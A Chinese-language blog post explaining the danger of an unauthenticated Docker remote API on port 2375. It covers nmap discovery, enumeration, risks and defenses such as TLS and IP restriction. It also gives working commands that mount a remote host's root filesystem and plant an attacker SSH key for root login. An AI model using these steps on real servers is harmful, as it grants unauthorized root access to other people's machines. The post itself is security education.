---
layout: post
title: Docker 远程API安全问题
date: 2023-09-17 12:33:24
description: Docker 远程API安全问题
keywords: docker, remote-api, secure
comments: true
categories: secure
tags: [docker, remote-api, secure]
---

{% img /images/post/2023/09/docker-vul.jpg 400 300 %}

[Docker](<https://en.wikipedia.org/wiki/Docker_(software)>) 为软件开发提供了很多便利，它允许软件在隔离的容器中运行，确保软件的一致性和可移植性。这意味着无论在哪个环境中，软件都能够以相同的方式运行，无需担心底层系统的差异，Docker 的镜像机制同时也让软件的部署和分发变得更加简单。尽管 Docker 提供了很多强大的功能，但如果这些功能没有使用好，那么它不仅无法发挥作用，还可能会带来严重的安全隐患，今天我们就来介绍下 Docker 下的远程 API 安全问题。

<!--more-->

## 攻击手法

首先我们来看下利用 Docker 远程 API 是如何进行攻击，下面的例子展示了通过 Docker 容器拿到主机的 shell 权限。

```bash
# 使用Docker API创建容器
docker -H 192.168.1.10:2375 run -it -v /:/mnt 8e01a1d0a1dd /bin/sh
# 将本地的SSH公钥添加到容器中
echo "黑客SSH公钥" >> /mnt/.ssh/authorized_keys
# 本地使用私钥登陆主机
ssh root@192.168.1.10
```

- 通过 Docker 的`-H`命令连上远程服务器上的 Docker API，这里的`192.168.1.10`是我们假设的一个主机 IP 地址，`2375`是 Docker 远程 API 常用的端口号。
- 利用 Docker 远程 API`docker run`新建一个容器，这里的`8e01a1d0a1dd`是一个远程服务器存在的镜像 ID，至于为什么可以知道这个镜像 ID，我们后面会介绍。
- 新建容器时将远程服务器的根目录`/`挂载到容器的`/mnt`目录下，这样容器就可以访问到远程服务器的根目录。
- 使用 Docker 的交互模式`-it`进入新建好的容器中。
- 进入容器后其实可以先查看下挂载目录下的 ssh 目录：`ls /mnt/.ssh`，确认存在相关文件了再执行`echo`语句。
- `echo`语句是将攻击者本地的公钥写到远程服务器的 SSH 授权文件中，这样攻击者就可以使用自己的私钥登陆远程服务器了。

整个过程看起来很简单，但要成功执行这个攻击，需要开启 Docker 的远程 API。

## 开启 Docker 远程 API

Docker 远程 API 也有很多用处，比如可以通过远程 API 来管理 Docker 集群，或者通过远程 API 来管理远程服务器上的 Docker 容器，这样就不需要登录到远程服务器上来管理容器了。一些 Docker 的图形化管理工具或 Docker 监控管理工具就是通过远程 API 来管理 Docker 的。

开启 Docker 的远程 API，可以通过修改 Docker 的配置文件（`/lib/systemd/system/docker.service`或者`/etc/systemd/system/docker.service.d/override.conf`）来进行开启：

```diff
# /lib/systemd/system/docker.service 文件
[Service]
-ExecStart=/usr/bin/dockerd -H fd:// --containerd=/run/containerd/containerd.sock
+ExecStart=/usr/bin/dockerd -H fd:// -H tcp://0.0.0.0:2375 --containerd=/run/containerd/containerd.sock
```

在 `ExecStart` 中添加`-H tcp://0.0.0.0:2375`即可，然后重新加载守护进程和重启 Docker 服务：

```bash
# 重新加载守护进程
sudo systemctl daemon-reload
# 重启Docker
sudo systemctl restart docker.service
```

我们可以验证一下 Docker 远程 API 是否开启成功：

```bash
$ sudo netstat -tulpn | grep 2375
tcp6       0      0 :::2375                 :::*                    LISTEN      757/dockerd
```

可以看到是正常监听在`2375`端口上了。

## 发现 Docker 远程 API

假设有一台服务器上开启了 Docker 远程 API，我们要如何发现服务器上有这个服务呢？这里其实用[Nmap](https://nmap.org/)工具来进行扫描。Nmap 是一个开源的网络扫描和安全审计工具。它被设计用来发现设备在网络上运行和查找开放的网络端口。

首先我们用 Nmap 扫描一下远程服务器上有哪些开放的端口：

```bash
sudo nmap -sS -T5 192.168.1.10 -p-
Password:
Starting Nmap 7.94 ( https://nmap.org ) at 2023-09-17 19:10 CST
Nmap scan report for 192.168.1.10
Host is up (0.00034s latency).
Not shown: 65533 closed tcp ports (reset)
PORT     STATE SERVICE
22/tcp   open  ssh
2375/tcp open  docker
MAC Address: AX:D:EF:F2:CA:46 (Unknown)

Nmap done: 1 IP address (1 host up) scanned in 4.77 seconds
```

可以看到有 2 个开放端口：22 和 2375，其中 22 是 SSH 服务，2375 是 Docker 服务。其实到这里我们就可以基本确认了服务器上开启了 Docker 远程 API 服务，但我们还是可以进一步确认一下服务信息。

```bash
nmap -sTV -p 2375 192.168.1.10
Starting Nmap 7.94 ( https://nmap.org ) at 2023-09-17 19:10 CST
Nmap scan report for 192.168.1.10
Host is up (0.089s latency).

PORT     STATE SERVICE VERSION
2375/tcp open  docker  Docker 24.0.6 (API 1.43)
Service Info: OS: linux

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 6.35 seconds
```

可以看到 2375 端口确实是 Docker 服务，并且还检查出了 Docker 的版本信息。现在我们可以用 Docker 命令来连接远程服务器上的 Docker 服务了，比如我们可以查询服务器上 Docker 更加详尽的版本信息：

```bash
$ docker -H 192.168.1.10:2375 version

Server: Docker Engine - Community
 Engine:
  Version:          24.0.6
  API version:      1.43 (minimum version 1.12)
  Go version:       go1.20.7
  Git commit:       1a79695
  Built:            Mon Sep  4 12:31:57 2023
  OS/Arch:          linux/arm64
  Experimental:     false
 containerd:
  Version:          1.6.22
  GitCommit:        8165feabfdfe38c65b599c4993d227328c231fca
 runc:
  Version:          1.1.8
  GitCommit:        v1.1.8-0-g82f18fe
 docker-init:
  Version:          0.19.0
  GitCommit:        de40ad0
```

还可以查看服务器上 Docker 的镜像信息（所以在最开始的示例中我们可以知道服务器上有哪些镜像 ID）：

```bash
# 查看远程服务器上的镜像
$ docker -H 192.168.1.10:2375 images
REPOSITORY    TAG       IMAGE ID       CREATED        SIZE
hello-world   latest    8e01a1d0a1dd4 months ago   9.14kB
```

## Docker 远程 API 的风险

Docker 远程 API 是一个强大的工具，允许用户远程管理和控制 Docker 容器。但是，如果这个 API 被黑客恶意利用，后果可能是灾难性的。在轻微的情况下，黑客可以利用这个 API 在服务器上随意创建和运行容器。例如，他们可能会部署**加密货币挖矿容器**，这样你的服务器资源就会被滥用来为黑客挖矿，从而为他们赚取利润，而你可能完全不知情。此外，黑客还可以创建用于分布式拒绝服务（DDoS）攻击的容器，也被称为**肉鸡**。这意味着你的机器可能会被用作发起大规模网络攻击的工具，这不仅会损害你的机器的性能，还可能导致你面临法律责任。

更为严重的是，如之前的示例所示，黑客可以通过 Docker 远程 API 获得对主机的完全 shell 访问权限。这不仅仅是对单台服务器的威胁。如果这台服务器是连接到企业内部网络的**关键节点**，那么黑客就有可能利用这个入口点进入整个企业网络。一旦他们获得了这样的访问权限，他们可以窃取敏感数据、破坏关键系统或进行其他恶意活动。这种入侵可能导致企业面临巨大的经济损失、品牌声誉受损，甚至可能违反数据保护法规，导致法律诉讼。

我们在访问 Docker 远程 API 时 Docker 也会提示相关的风险，具体信息可以看[Docker 官方文档](https://docs.docker.com/engine/security/#docker-daemon-attack-surface)。

```bash
WARNING: API is accessible on http://0.0.0.0:2375 without encryption.
         Access to the remote API is equivalent to root access on the host. Refer
         to the 'Docker daemon attack surface' section in the documentation for
         more information: https://docs.docker.com/go/attack-surface/
```

## 现实世界

可能有人会问，如果 Docker 远程 API 有这么大的安全风险，那应该没有人会开启这个服务吧？其实不然，我们可以用网络空间搜索引擎[ZoomEye](https://www.zoomeye.org/)来搜索一下目前全球开启了 Docker 远程 API 的服务器有多少：

{% img /images/post/2023/09/zoomeye.png 1000 600 %}

可以看到全球有 700 多台服务器上开启了 Docker 远程 API，有些人可能不了解 Docker 远程 API 的安全问题，有些人可能是因为一些环境而默认开启的，这样服务器就会面临被攻击的风险。

## 如何防范

最好的防范措施就是不要开启 Docker 远程 API，如果确实需要开启，那么就要对 Docker 远程 API 进行安全配置，下面列举了一些开启 Docker 远程 API 的安全措施：

- 限制特定 IP 访问：如果你想允许特定的 IP 地址访问 Docker 远程 API，可以使用防火墙规则（如 iptables）来限制只允许受信任的 IP 地址访问端口。
- 基于证书的身份验证：Docker 支持使用 TLS 证书进行身份验证，启动 Docker 远程 API 时指定证书路径，客户端也需要使用相应的证书来连接到 Docker 远程 API。
- 用户名密码认证：Docker 远程 API 本身不支持基于用户名和密码的身份验证。但你可以使用反向代理（如 Nginx 或 Apache）来为 Docker API 提供这种身份验证。

## 总结

在这篇文章中，我们介绍了 Docker 远程 API 的安全问题，以及如何发现和利用 Docker 远程 API 进行攻击。Docker 远程 API 是一个强大的工具，但如果没有安全配置，那么它就会成为一个安全隐患。因此，我们应该尽可能地避免开启 Docker 远程 API，如果确实需要开启，那么就要对 Docker 远程 API 进行安全配置。
